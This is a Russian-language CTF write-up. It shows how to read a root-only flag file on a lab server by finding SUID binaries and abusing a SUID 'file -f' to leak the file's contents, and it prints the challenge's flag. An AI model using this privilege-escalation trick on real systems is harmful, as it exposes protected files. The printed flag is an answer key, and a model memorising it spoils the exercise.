# Secure Unusual Iconical Dock writeup
Попав на сервер, видим флаг в текущей директории:

```bash
$ ls
flag.txt
```

Но при попытке открыть получаем:

```bash
$ cat flag.txt
cat: flag.txt: Permission denied
```

Это означает, что у нас недостаточно привелегий для совершения данного действия. Давайте в этом убедимся:

```bash
$ ls -lah
total 12K
drwxr-xr-x 1 root root 4.0K Oct 10 18:05 .
drwxr-xr-x 1 root root 4.0K Oct 10 18:10 ..
-r-------- 1 root root   53 Oct 10 18:04 flag.txt
```

Как понятно из вывода **ls**, никто кроме **root** не может читать флаг. Поэтому, нам нужно каким-то образом повысить свои привелегии. Гугл и аббревиатура названия таска (**S**ecure **U**nusual **I**conical **D**ock) ведут нас к термину **SUID**. SUID - режим запускаемого файла, который позволяет любому пользователю запускать файл с привелегиями его владельца. Давайте поищем такие бинари на машине:

```bash
$ find / -type f -perm -4000 2>>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/file
```

И среди прочего мы видим необычную для SUID утилиту - **file**. Эта утилита отобржаает формат файла и некоторую информацию о нем. Полезным нам флагом является "-f" - он читает из указаанного файла список файлов и по очереди обрабатывает их все. А как мы знаем, если мы пытаемся открыть несуществующий файл, то прога, с помощью которой мы это делаем, выбросит примерно такую ошибку: `${program_name}: ${filename}: No such file or directory`. Используем это удобное свойство:

```bash
$ file -f flag.txt
li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}: cannot open `li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}' (No such file or directory)
```

P.S. `2>>/dev/null`  - это небольшой трюк, который позволяет скрыть ошибки программы (так как **find** будет печатать каждый Permission Denied, который он встретит, а нам явно это не нужно). Фактически, это перенаправляет `stderr` программы в специальный девайс - **/dev/null**

Флаг: `li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}`
